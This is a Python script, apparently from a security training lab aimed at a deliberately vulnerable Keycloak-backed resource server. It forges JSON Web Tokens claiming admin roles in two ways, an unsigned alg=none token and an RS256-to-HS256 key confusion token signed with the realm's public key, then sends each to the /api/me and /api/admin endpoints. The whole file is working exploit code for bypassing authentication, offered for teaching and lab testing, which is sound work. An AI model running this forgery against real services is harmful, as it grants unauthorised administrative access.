#!/usr/bin/env python3
"""Подделка JWT против уязвимого resource server (модуль 05).

Демонстрирует:
  1) alg=none  — токен без подписи принимается;
  2) RS256 -> HS256 confusion — подпись HMAC публичным ключом realm'а (PEM).

Ключ берётся из JWKS Keycloak (n/e) и превращается в PEM тем же кодом, что и на RS.

Пример:
  python3 jwt_forge.py --user admin --roles admin
"""
import argparse
import base64
import hashlib
import hmac
import json
import os
import urllib.error
import urllib.request

from jwks import jwks_to_pem


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def jwt(header: dict, payload: dict, secret: bytes | None) -> str:
    signing_input = f"{b64url(json.dumps(header, separators=(',', ':')).encode())}." \
                    f"{b64url(json.dumps(payload, separators=(',', ':')).encode())}"
    if secret is None:  # alg=none — пустая подпись
        return signing_input + "."
    sig = hmac.new(secret, signing_input.encode(), hashlib.sha256).digest()
    return signing_input + "." + b64url(sig)


def get(url: str) -> str:
    with urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": "lab"}), timeout=8) as r:
        return r.read().decode()


def call_rs(rs: str, path: str, token: str):
    req = urllib.request.Request(f"{rs}{path}", headers={"Authorization": f"Bearer {token}"})
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--url", default=os.environ.get("KC_URL", "http://keycloak.127.0.0.1.nip.io:8080"))
    p.add_argument("--realm", default="vulnerable")
    p.add_argument("--rs", default=os.environ.get("RS_URL", "http://localhost:8090"))
    p.add_argument("--user", default="admin")
    p.add_argument("--roles", nargs="*", default=["admin"])
    a = p.parse_args()
    base, rs = a.url.rstrip("/"), a.rs.rstrip("/")

    jwks = json.loads(get(f"{base}/realms/{a.realm}/protocol/openid-connect/certs"))
    pem = jwks_to_pem(jwks)
    print("[*] Realm public key (PEM):\n" + pem)

    payload = {
        "sub": "forged-sub",
        "preferred_username": a.user,
        "realm_access": {"roles": a.roles},
        "iss": f"{base}/realms/{a.realm}",
        "exp": 9999999999,
    }

    variants = {
        "alg=none    ": jwt({"alg": "none", "typ": "JWT"}, payload, None),
        "HS256+pubkey": jwt({"alg": "HS256", "typ": "JWT"}, payload, pem.encode()),
    }

    for name, token in variants.items():
        print(f"\n[{name}] token={token[:70]}...")
        for path in ("/api/me", "/api/admin"):
            code, body = call_rs(rs, path, token)
            print(f"    {path:11s} -> {code} {body[:120]}")


if __name__ == "__main__":
    main()